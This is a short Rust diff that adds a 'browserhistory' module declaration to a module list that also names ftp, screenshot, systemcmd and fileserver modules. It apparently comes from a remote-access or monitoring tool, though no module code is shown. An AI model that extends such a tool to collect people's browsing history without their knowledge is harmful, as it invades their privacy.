@@ -6,5 +6,6 @@ pub mod ftp;
 pub mod screenshot;
 pub mod systemcmd;
 pub mod fileserver;
+pub mod browserhistory;
 #[cfg(target_os = "windows")]
 pub mod windowsfunctions;
